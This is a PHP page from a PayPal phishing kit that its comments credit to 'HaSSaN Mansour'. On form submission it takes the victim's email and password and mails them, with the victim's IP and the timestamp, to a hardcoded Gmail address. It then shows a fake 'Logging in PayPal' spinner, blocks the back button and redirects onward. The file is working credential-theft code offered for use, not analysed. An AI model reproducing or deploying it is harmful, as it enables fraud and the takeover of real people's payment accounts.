<?php

if (isset($_POST['_H1_']) && isset($_POST['_H2_'])){

$ip	 = $_SERVER['REMOTE_ADDR'];
$negara  = $details->country_code;
$nama_negara = $details->country;
$kode_negara = strtolower($negara);

$date = gmdate("Y/m/d | H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];
///========================// SCAM BY HaSSaN Mansour \\========================\\\
$email    = $_POST['_H1_'];
$password = $_POST['_H2_'];
///===================// Special For $$ HunTerZ Family \\===================\\\


  

//+++++++++++++++++++++++++++++// ISI PESAN \\+++++++++++++++++++++++++++++\\
$message   = "
++========[ ReZulT - SCAM BY HaSSaN Mansour ]========++

      .++====[ PayPal ]====++.
Email     :  ".$email."
Password  :  ".$password."
      .++======[ End ]======++.
|====================== 	PC-INFO ====================||
||Date / time	    : $date
||Client IP         : http://www.geoiptool.com/?IP=$ip
      .++======[ End ]======++.

++===[ ^_^ PriVate - SCAM BY HaSSaN Mansour ^_^ ]===++
\n";
//+++++++++++++++++++++++++++++\\ ISI PESAN //+++++++++++++++++++++++++++++\\\
$send = "alouani987@gmail.com";

$subject = "PayPal (".$nama_negara.") (".$ip.")";
$headers = "From: PP Spam Result <Hassan@pp-result.com>";
mail($send, $subject, $message, $headers);

$md5      = md5(gmdate("r"));
$sha1     = sha1(gmdate("r"));
?>


<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta http-equiv="refresh" content="4; url=Sc.php?y=<?php echo md5(rand(100, 999999999)); ?>">
<title>Logging in &Rho;ay&Rho;al</title>
<meta http-equiv="X-UA-Compatible" content="IE=9">
<link media="screen" rel="stylesheet" type="text/css" href="file/global.css">
<style type="text/css">#page{width:auto;max-width:750px}#rotatingImg{display:none}#rotatingDiv{display:block;margin:32px auto;height:30px;width:30px;-webkit-animation:rotation .7s infinite linear;-moz-animation:rotation .7s infinite linear;-o-animation:rotation .7s infinite linear;animation:rotation .7s infinite linear;border-left:8px solid rgba(0,0,0,.20);border-right:8px solid rgba(0,0,0,.20);border-bottom:8px solid rgba(0,0,0,.20);border-top:8px solid rgba(33,128,192,1);border-radius:100%}@keyframes rotation{from{transform:rotate(0deg)}to{transform:rotate(359deg)}}@-webkit-keyframes rotation{from{-webkit-transform:rotate(0deg)}to{-webkit-transform:rotate(359deg)}}@-moz-keyframes rotation{from{-moz-transform:rotate(0deg)}to{-moz-transform:rotate(359deg)}}@-o-keyframes rotation{from{-o-transform:rotate(0deg)}to{-o-transform:rotate(359deg)}}h3{font-size:1.4em;margin:4em 0 0;line-height:normal}p.note{color:#656565;font-size:1.2em}p.note a{color:#656565}p strong{margin-top:2em;color:#1A3665;font-size:1.25em}img.actionImage{margin:2em auto}</style>
<CENTER>
<SCRIPT type="text/javascript">window.history.forward();function noBack() { window.history.forward(); }</SCRIPT>
<link rel="shortcut icon" href="file/pp_favicon_x.ico">
<link rel="apple-touch-icon" href="file/apple-touch-icon.png">
</head>
<body onload="noBack();" onpageshow="if (event.persisted) noBack();" onunload="">
<div class="" id="page">
    <div id="content">
        <div id="headline">
            <h2 class="accessAid">Logging in</h2>
</div>
<div id="messageBox"></div>
    <div id="main">
        <div class="layout1 textcenter">
           
<div id="rotatingDiv"></div>
    <img id="rotatingImg" border="0" class="actionImage" alt="Logging you in securely">
        <p class="note">If this page appears for more than 5 seconds, 
            <a href="Sc.php?y=<?php echo md5(rand(100, 999999999)); ?>">click here</a> to reload.</p></div></div></div>
</div>

<script type="text/JavaScript">
<!--


-->
</script>
    </body>
</html>
<?
}else{header('Location: ./err.php?y= <?php echo md5(rand(100, 999999999)); ?>');}
?>